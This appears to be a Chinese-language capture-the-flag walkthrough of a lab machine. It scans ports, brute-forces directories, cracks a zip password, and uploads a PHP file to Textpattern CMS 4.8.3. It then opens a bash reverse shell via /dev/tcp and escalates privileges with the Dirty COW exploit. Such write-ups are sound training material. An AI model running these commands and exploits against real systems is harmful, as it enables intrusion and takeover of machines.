### 端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.120
```

```
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:8B:74:69 (Oracle VirtualBox virtual NIC)
```

### web渗透

`robots.txt`

![image-20241020160643438](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020160643438.png)

告诉我们进行目录爆破时，添加`zip`后缀，还有一个路径`/textpattern/textpattern`

```bash
gobuster dir -u http://192.168.56.120 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip
```

![image-20241020160959695](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020160959695.png)

发现压缩包有密码

```bash
┌──(root㉿kali)-[/tmp]
└─# fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt spammer.zip


PASSWORD FOUND!!!!: pw == myspace4
```

或者利用`john`进行破解

```bash
zip2john spammer.zip > hash
```

```
john hash -w=/usr/share/wordlists/rockyou.txt
```

得到一对凭据`mayer:lionheart`，可以登录网站了

发现是一个cms，知道了版本号

`Textpattern CMS  (v4.8.3)`

![image-20241020161519629](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020161519629.png)

看了一下，发现就是文件上传，自己利用一下吧

![image-20241020161624471](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020161624471.png)

没有过滤，直接上传

路径是：`http://192.168.56.120/textpattern/files/2.php`

### 系统立足点

反弹shell即可

```
/bin/bash -i >& /dev/tcp/192.168.56.101/1234 0>&1
```

### 尝试提权

```
sudo -l
cat /etc/crontab
find / -perm -u=s -type f 2>/dev/null
getcap -r 2>/dev/null 
find / -writable 2>/dev/null 
uname -a
```

最后发现内核版本是

![image-20241020161953436](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020161953436.png)

搜索找到exp

https://www.exploit-db.com/exploits/40839

#### 脏牛提权

```bash
wget https://www.exploit-db.com/download/40839
```

![image-20241020162438445](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020162438445.png)

上传到靶机，进行编译

```
gcc -o exp exp.c -lpthread -lcrypt
```

![image-20241020162233141](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020162233141.png)

把root用户改成`firefart`，密码自己输入

![image-20241020162402669](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241020162402669.png)